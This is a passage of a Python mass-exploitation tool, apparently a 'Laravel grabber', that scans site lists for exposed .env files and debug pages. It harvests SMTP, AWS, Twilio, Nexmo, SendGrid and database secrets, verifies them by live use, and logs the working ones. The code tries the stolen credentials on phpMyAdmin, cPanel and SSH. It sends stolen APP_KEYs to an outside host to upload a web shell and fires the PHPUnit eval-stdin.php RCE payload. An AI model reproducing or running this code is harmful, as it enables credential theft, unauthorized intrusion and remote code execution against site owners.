                                    open('Result/email_dump.txt','a').write(emain+'\n')
                return True
            else:
                return False
        else:
            req = requests.Session()
            uwu = req.get(pol + '/phpMyAdmin', headers=head, timeout=int(default_timeout))
            if 'pma_username' in uwu.text:
                if "pma_servername" in uwu.text:
                    open('phpmyadmin.txt','a').write(pol+'/phpMyAdmin\n')
                token = re.findall('<input type="hidden" name="token" value="(.*?)"', uwu.text)[0]
                data = {
                    'pma_username': user,
                    'pma_password': pw,
                    'server': '1',
                    'target': 'index.php',
                    'token': token
                }
                coba = req.post(pol + '/phpMyAdmin/index.php', data=data, timeout=int(default_timeout))
                if 'Log out' in coba.text or token in coba.url:
                    open('Result/phpmyadmin.txt', 'a').write(pol + '/phpMyAdmin' + '|{}|{}'.format(user, pw) + '\n')
                    return True
                else:
                    return False
            else:
                return False

    except:
        pass


def adminer(target, user, pw):
    try:
        if 'https://' in target:
            pol = 'https://' + parser_url(target)
        elif 'https://' in target:
            pol = 'https://' + parser_url(target)
        su = ['/Adminer.php', '/adminer.php']
        for pape in su:
            cc = requests.Session()
            go = cc.get(pol + pape, headers=head, timeout=12)
            if 'Login - Adminer' in go.text or 'class="jush-sql jsonly hidden"' in go.content:
                pass
    except:
        return False


def login_nexmo(f_url, f_key, f_secret):
    try:
        f_key = str(f_key)
        f_secret = str(f_secret)
        cl = vonage.Client(key=f_key, secret=f_secret)
        res = cl.get_balance()
        open('Result/nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
    except:
        pass

def ceker_sendgrid(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Result/sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
            smtp_login(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def appkeyrce(target, keyy):
    try:
        if 'base64:' in keyy:
            keyy = keyy.replace('base64:', '')
        pdata = {
            'target': target,
            'key': keyy,
            'autoshell': 'Auto+Upload+Shell'
        }
        purl = 'https://exploit.anons79.com'
        upShell = requests.post(purl, data=pdata, headers=head, timeout=22).text
        cekShell = re.findall("""<a href='(.*?)' target='_blank'>""", upShell)
        if cekShell:
            open('Result/shell.txt', 'a').write(cekShell[0] + '\n')
            return True
        else:
            return False
    except:
        return False


def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False,comment=False):
    hostnya = str(hostnya)
    portnya = str(portnya)
    usernya = str(usernya)
    pwnya = str(pwnya)
    if tutor == 'env':
        if mail_fromer:
            mail_from = mail_fromer
        else:
            ####### GET MAIL FROM ######
            try:
                if "MAIL_FROM_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_FROM=" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                else:
                    mail_from = False
            except:
                mail_from = False
        ############################
        ###### GET MAIL NAME #######
        try:
            mail_name = re.findall('MAIL_FROM_NAME=(.*?)\n', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('APP_NAME=(.*?)\n', target)[0]
                if mail_name.startswith('"') and mail_name.endswith('"'):
                    mail_name = mail_name.replace('"', '')
                if mail_name.startswith("'") and mail_name.endswith("'"):
                    mail_name = mail_name.replace("'", '')
            else:
                if '\r' in mail_name:
                    mail_name = mail_name.replace('\r', '')
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
                else:
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
        except:
            mail_name = False
        ############################
    elif tutor == 'debug':
        try:
            mail_from = re.findall('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '@' in mail_from:
                pass
            else:
                mail_from = False
        except:
            mail_from = False
        try:
            mail_name = re.findall('<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('<td>APP_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            else:
                mail_name = False
        except:
            mail_name = False
    msg = MIMEMultipart()
    msg['subject'] = 'TES SMTP!!'
    if mail_name:
        msg['from'] = mail_name
    else:
        msg['from'] = usernya
    if mail_from:
        sender = mail_from
    else:
        sender = usernya
    msg['to'] = email_receiver
    msg.add_header('Content-Type', 'text/html')
    if mail_name:
        if comment:
            msg.attach(MIMEText(comment, 'html', 'utf-8'))
        else:
            msg.attach(MIMEText('host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br>from name => {} <br><br>SMTP Tested By Ridho'.format(hostnya, portnya, usernya, pwnya, sender, mail_name), 'html', 'utf-8'))
    else:
        if comment:
            msg.attach(MIMEText(comment, 'html', 'utf-8'))
        else:
            msg.attach(MIMEText('host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br><br>SMTP Tested By Ridho'.format(hostnya, portnya, usernya, pwnya, sender), 'html', 'utf-8'))
    try:
        server = smtplib.SMTP(hostnya, int(portnya),timeout=15)
        server.login(usernya, pwnya)
        server.sendmail(sender, [msg['to']], msg.as_string())
        server.quit()
        if mail_name:
            open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\nMAIL_FROM_NAME={}\n'.format(hostnya, portnya, usernya, pwnya, sender, mail_name))
        else:
            open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\n'.format(hostnya, portnya, usernya, pwnya, sender))
    except:
        try:
            server = smtplib.SMTP(hostnya, int(portnya),timeout=15)
            server.starttls()
            server.login(usernya, pwnya)
            server.sendmail(sender, [msg['to']], msg.as_string())
            server.quit()
            if mail_name:
                open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\nMAIL_FROM_NAME={}\n'.format(hostnya, portnya, usernya, pwnya, sender, mail_name))
            else:
                open('Result/SMTP/smtp_live.txt', 'a').write('-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\n'.format(hostnya, portnya, usernya, pwnya, sender))
        except:
            pass


def ceker_twilio(f_url, f_sid, f_token):
    try:
        f_sid = str(f_sid)
        f_token = str(f_token)
        tes123 = requests.get('https://api.twilio.com/2010-04-01/Accounts/'+f_sid+'/Balance.json', auth=(f_sid,f_token)).json()
        '''
        cll = Client(f_sid, f_token)
        acc = cll.api.accounts(f_sid).fetch()
        balance = acc['subresource_uris']['balance']
        '''
        balance = str(tes123['balance'])+' '+str(tes123['currency'])
        cl = Client(f_sid,f_token)
        num = cl.incoming_phone_numbers.list(limit=20)
        dump_number = []
        for xxx in num:
            dump_number.append(xxx.phone_number)
        from_number = str(random.choice(dump_number))
        try:
            tes_send = cl.messages.create(
                body='TES TWIlIO APIKEY by RIDHO\nSID={}\nTOKEN={}\nFROM_NUMBER={}'.format(f_sid,f_token,from_number),
                from_=from_number,
                to= from_number[:len(from_number)-2]+'00'
            )
        except Exception as ppppppp:
            status = str(ppppppp)
            tes_send = ''
        try:
            if tes_send.status == 'die':
                status = 'Cant send sms'
            elif status == 'sent':
                status = 'LIVE'
            else:
                status = 'Cant send sms'
        except:
            status = 'Cant send sms'
        open('Result/twilio_live.txt', 'a').write('-'*30+'\nSID={}\nTOKEN={}\nBALANCE={}\nFROM_NUMBER={}\nSTATUS={}\n'.format(f_sid,f_token,balance,from_number,status))
    except:
        pass


def ceker_aws(f_url, f_key, f_secret, f_region):
    try:
        f_region = str(f_region)
        f_key = str(f_key)
        f_secret = str(f_secret)
        klien = boto3.client(
            'ses',
            aws_access_key_id=f_key,
            aws_secret_access_key=f_secret,
            region_name=f_region
        )
        balance = klien.get_send_quota()['Max24HourSend']
        open('Result/aws_key_live.txt', 'a').write('{}|{}|{}|{}|{}'.format(f_url, f_key, f_secret, f_region, balance) + '\n')
    except:
        pass
def sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()
def cpanel_login(peh,user,passwd):
    peh = str(peh)
    if 'https://' in peh:
       tot = parser_url(peh)
       if tot:
           urlnya = f'https://{tot}'
    elif 'https://' in peh:
        tot = parser_url(peh)
        if tot:
            urlnya = f'https://{tot}' 
    user = str(user)
    passwd = str(passwd)
    try:
        datanya = {
            'user':user,
            'pass':passwd,
        }
        print(datanya)
        url1 = f'{urlnya}:2083/login/?login_only=1'  
        heders = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '31',
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'timezone=Asia/Jakarta; cpsession=closed',
            'Host': f'{parser_url(urlnya)}:2083',
            'Origin': f'{urlnya}:2083',
            'Referer': f'{urlnya}:2083/logout/?locale=en',
            'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36',
        }
        reqqq = requests.Session()
        tess = reqqq.post(url1,data=datanya,headers=heders,timeout=12,allow_redirects=True).text
        if 'redirect' in tess:
            #print(tess)
            sub = re.findall('"redirect":"(.*?)"',tess)[0]
            url2 = f'{urlnya}:2083{sub}'
            #print(url2)
            pepw = reqqq.get(url2,timeout=12).text
            if '<title>cPanel - Main</title>' in pepw:
                open('Result/cpanel.txt','a').write(f'{urlnya}:2083|{user}|{passwd}\n')
                return True
            else:
                #print('not cpanel')
                return False
        else:
            return False
    except:
        return False
def convert_aws(f_key,f_secret,f_region):
    DATE = "11111111"
    SERVICE = "ses"
    MESSAGE = "SendRawEmail"
    TERMINAL = "aws4_request"
    VERSION = 0x04
    signature = sign(("AWS4" + f_secret).encode('utf-8'), DATE)
    signature = sign(signature, f_region)
    signature = sign(signature, SERVICE)
    signature = sign(signature, TERMINAL)
    signature = sign(signature, MESSAGE)
    signatureAndVersion = bytes([VERSION]) + signature
    smtpPassword = base64.b64encode(signatureAndVersion)



class laravel_grabber:
    def __init__(self):
        self.env = 0
        self.debug = 0
        self.loop = 0
        self.bad = 0
        self.smtp = 0
        self.database = 0
        self.nexmo = 0
        self.aws = 0
        self.twilio = 0
        self.unit = 0
        self.paypal = 0
        self.home()

    def attack(self, ts):
        self.loop += 1
        if os.name == 'nt' and sys.version_info.major == 3:
            ctypes.windll.kernel32.SetConsoleTitleW("{}|ENV=>({})|DEBUG=>({})|SMTP=>({})|DB=>({})|AWS=>({})|NEXMO=>({})|TWILIO=>({})|SHELL=>({})".format(self.loop, self.env, self.debug, self.smtp, self.database, self.aws, self.nexmo, self.twilio,self.unit))
        try:
            tos = gas(ts)
            # print(tos)
            if tos['status'] == 'ok':
                if tos['method'] == 'env':
                    self.env += 1
                elif tos['method'] == 'debug':
                    self.debug += 1
                with open('valid_' + tos['method'] + '.txt', 'a') as ww:
                    ww.write(tos['url'] + '\n')
                text = ''
                smtp = grabber().get_smtp(tos['method'], tos['url'], tos['respon'])
                if smtp:
                    self.smtp += smtp
                    text += '[\033[92mSMTP\033[0m]'
                databes = grabber().get_database(tos['method'], tos['url'], tos['respon'])
                if databes:
                    self.database += 1
                    text += '[\033[92mDB\033[0m]'
                nexmo = grabber().get_nexmo(tos['method'], tos['url'], tos['respon'])
                if nexmo:
                    self.nexmo += 1
                    text += '[\033[92mNEXMO\033[0m]'
                awees = grabber().get_aws(tos['method'], tos['url'], tos['respon'])
                if awees:
                    self.aws += awees
                    text += '[\033[92mAWS\033[0m]'
                tw = grabber().get_twilio(tos['method'], tos['url'], tos['respon'])
                if tw:
                    self.twilio += 1
                    text += '[\033[92mTWILIO\033[0m]'
                if grabber().get_paypal(tos['method'], tos['url'], tos['respon']):
                    self.paypal += 1
                    text += '[\033[92mPAYPAL\033[0m]'
                if grabber().get_smsto(tos['method'], tos['url'], tos['respon']):
                    smsto += 1
                    text += '[\033[92mSMSTO\033[0m]'
                plivo = grabber().get_plivo(tos['method'], tos['url'], tos['respon'])
                if plivo:
                    self.plivo += 1
                    text += '[\033[92mPLIVO\033[0m]'
                if tos['method'] == 'env':
                    try:
                        shell = phpunit(tos['url'])
                        if shell:
                            self.unit += 1
                            text += '[\033[92mPHPUNIT\033[0m]'
                    except:
                        pass
                stripe = grabber().get_stripe(tos['method'], tos['url'], tos['respon'])
                if stripe:
                    text += '[\033[92mSTRIPE\033[0m]'
                fpt = grabber().get_ftp(tos['method'], tos['url'], tos['respon'])
                if fpt:
                    text += '[\033[92mFTP\033[0m]'
                if tos['method'] == 'env':
                    try:
                        keynya = re.findall('APP_KEY=(.*?)\n', tos['respon'])[0]
                        if '\r' in keynya:
                            keynya = keynya.replace('\r', '')
                        if appkeyrce(tos['url'].replace('.env', ''), keynya):
                            self.unit += 1
                            text += '[\033[92mAPPKeyRCE\033[0m]'
                    except:
                        pass
                    try:
                        user = re.findall('DB_USERNAME=(.*?)\n', tos['respon'])[0]
                        if '\r' in user:
                            user = user.replace('\r', '')
                        passwd = re.findall('DB_PASSWORD=(.*?)\n', tos['respon'])[0]
                        if '\r' in passwd:
                            passwd = passwd.replace('\r', '')
                        if user == '' or passwd == '':
                            pass
                        else:
                            lihat = phpmyadmin(tos['url'], user, passwd)
                            if lihat:
                                text += '[\033[92mphpMyAdmin\033[0m]'
                    except:
                        pass
                    try:
                        try:
                            user = re.findall('DB_USERNAME=(.*?)\n', tos['respon'])[0]
                        except:
                            user = re.findall('DB_MYSQL_USERNAME=(.*?)\n', tos['respon'])[0]
                        if user.startswith('"') and user.endswith('"'):
                            user = user.replace('"', '')
                        if user.startswith("'") and user.endswith("'"):
                            user = user.replace("'", '')
                        if '\r' in user:
                            user = user.replace('\r', '')
                        try:
                            passwd = re.findall('DB_PASSWORD=(.*?)\n', tos['respon'])[0]
                        except:
                            passwd = re.findall('DB_MYSQL_PASSWORD=(.*?)\n', tos['respon'])[0]
                        if passwd.startswith('"') and passwd.endswith('"'):
                            passwd = passwd.replace('"', '')
                        if passwd.startswith("'") and passwd.endswith("'"):
                            passwd = passwd.replace("'", '')
                        if '\r' in passwd:
                            passwd = passwd.replace('\r', '')
                        if user == '' or passwd == '':
                            pass
                        else:
                            try:
                                try:
                                    hs = re.findall('DB_HOST=(.*?)\n', tos['respon'])[0]
                                except:
                                    hs = re.findall('DB_MYSQL_HOST=(.*?)\n', tos['respon'])[0]
                                if hs.startswith('"') and hs.endswith('"'):
                                    hs = hs.replace('"', '')
                                if hs.startswith("'") and hs.endswith("'"):
                                    hs = hs.replace("'", '')
                                if hs == 'localhost' or hs == '' or hs == 'null' or hs == '127.0.0.1':
                                    hs = False
                            except:
                                hs = False
                            if hs:
                                hostname = parser_url(tos['url'])
                                if login(hs, user, passwd):
                                    text += '[\033[92mSSH\033[0m]'
                                else:
                                    if login(hostname, user, passwd):
                                        text += '[\033[92mSSH\033[0m]'
                                    else:
                                        pass
                            else:
                                hostname = parser_url(tos['url'])
                                if login(hostname, user, passwd):
                                    text += '[\033[92mSSH\033[0m]'
                    except:
                        pass

                elif tos['method'] == 'debug':
                    try:
                        keynya = re.findall('<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        if '&amp;' in keynya:
                            keynya = keynya.replace('&amp;','')
                        if appkeyrce(tos['url'], keynya):
                            text += '[\033[92mAPPKeyRCE\033[0m]'
                            self.unit += 1
                    except:
                        pass
                    try:
                        user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        if '&amp;' in user:
                            user = user.replace('&amp;','')
                        passwd = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        if '&amp;' in passwd:
                            passwd = passwd.replace('&amp;','')
                        if user == '' or passwd == '' or '*****' in user:
                            pass
                        else:
                            admin = phpmyadmin(tos['url'], user, passwd)
                            if admin:
                                text += '[\033[92mphpMyAdmin\033[0m]'
                    except:
                        pass
                    try:
                        user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        # print(user)
                        if '\r' in user:
                            user = user.replace('\r', '')
                        if '&amp;' in user:
                            user = user.replace('&amp;','')
                        passwd = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        if '&amp;' in passwd:
                            passwd = passwd.replace('&amp;','')
                        # print(passwd)
                        if '\r' in passwd:
                            passwd = passwd.replace('\r', '')
                        if user == '' or passwd == '' or '*****' in user:
                            pass
                        else:
                            hostname = parser_url(tos['url'])
                            if login(hostname, user, passwd):
                                text += '[\033[92mSSH\033[0m]'
                    except:
                        pass
                print(
                    hijau + '#' + reset + ' {} \033[36m=>\033[0m \033[93m{}\033[0m {}'.format(tos['url'], tos['method'],text))

            else:
                gogo = requests.get(ts + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',data='<?php system("ls -al");?>', headers=head, allow_redirects=False, timeout=21)
                if 'drwxr-xr-x' in gogo.text or '-rw-r--r--' in gogo.text or 'drwxr-x---' in gogo.text or 'drwxr' in gogo.text:
                    if phpunit(ts + '/.env'):
                        print(hijau + '#' + reset + ts + ' => [\033[92mPHPUNIT\033[0m]')
                        self.unit += 1
                    else:
                        print(merah + '#' + reset + ' {} - '.format(tos['url']) + merah + "Cant Get Everything")
                else:
                    print(merah + '#' + reset + ' {} - '.format(tos['url']) + merah + "Cant Get Everything")
        except:
            print(kuning + '#' + reset + ' {} - '.format(ts) + kuning + "Cant Access Site")

    def cekHttp(self, ez):
        resume = False
        try:
            if 'https://' in ez:
                ez = re.findall('https://(.*?)/', ez)[0]
                # print(ez)
                self.attack('https://' + ez)
                resume = False
            elif 'https://' in ez:
                ez = re.findall('https://(.*?)/', ez)[0]
                self.attack('https://' + ez)
                resume = False
            else:
                resume = True
        except:
            resume = True
        if resume:
            #print(ez.replace('\n',''))
            ez = parser_url(ez.replace('\n',''))
            #print(ez)
            if ez:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(6)
                    ress = sock.connect_ex((ez, 80))
                    sock.close()
                    if str(ress) == '0':
                        self.attack('https://' + ez)
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(6)
                        ress = sock.connect_ex((ez, 443))
                        sock.close()
                        if str(ress) == '0':
                            self.attack('https://' + ez)
                        else:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(6)
                            ress = sock.connect_ex((ez, 8080))
                            sock.close()
                            if str(ress) == '0':
                                self.attack('https://' + ez + ':8080')
                            else:
                                if ':' in ez:
                                    key = ez.split(':')
                                    if key[1].isdigit():
                                        try:
                                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            sock.settimeout(18)
                                            ress = sock.connect_ex((ez, int(key[1])))
                                            sock.close()
                                            if str(ress) == '0':
                                                self.attack('https://' + ez + ':' + key[1])
                                        except:
                                            pass
                                    else:
                                        pass
                                else:
                                    pass
                except:
                    print(kuning + '#' + reset + ' {0} - '.format('https://'+str(ez)) + kuning + "Cant Access Site")

    def home(self):
        try:
            os.mkdir('Result')
        except:
            pass
        try:
            os.mkdir('Result/SMTP')
        except:
            pass
        file = prompt('[+] List : ')
        th = ThreadPool(int(prompt('[+] Threads : ')))
        print('-' * 50)
        with open(file) as self.list_file:
            for site in self.list_file:
                #self.cekHttp(site.replace('\r',''))
                try:
                    th.add_task(self.cekHttp, str(site).replace('\r', '').replace('\n', ''))
                    #print('oke')
                except Exception as www:
                    print('[Error] : {}'.format(www))
            th.wait_completion()

def random_color():
    colors = [
        '\033[91m',
        '\033[92m',
        '\033[93m',
        '\033[94m',
        '\033[95m',
        '\033[96m',
        '\033[31m',
        '\033[32m',
        '\033[33m',
        '\033[34m',
        '\033[35m',
        '\033[36m',
    ]
    return random.choice(tuple(colors))
def banner():
    print('''
    {}=,    (\_/)    ,=  ( Author : Ridho )
     {}/`-'--(")--'-'\   ( fb     : fb.me/mita )
    {}/     (___)     \  ( wa     : wa.me/+628311    )
   {}/.-.-./ " " \.-.-.\ ( version : 1.5 )
'''.format(random_color(),random_color(),random_color(),random_color()))
    print('-' * 50)


def license():
    user = uuid.getnode()
    database = requests.get('https://raw.githubusercontent.com/ridhoNoob/lisensi/main/pepek.txt').text
    if str(user) in database:
        return True
    else:
        return False


banner()
laravel_grabber()
"""
p = license()
if p:
    os.system('cls' if os.name=='nt' else 'clear')
    banner()
    laravel_grabber()
else:
    from getpass import getpass
    banner()
    code = uuid.getnode()
    print('\t    Code : {}'.format(code))
    print('\n\033[33m[#] Please send the code to the author for activation')
    getpass('')
"""
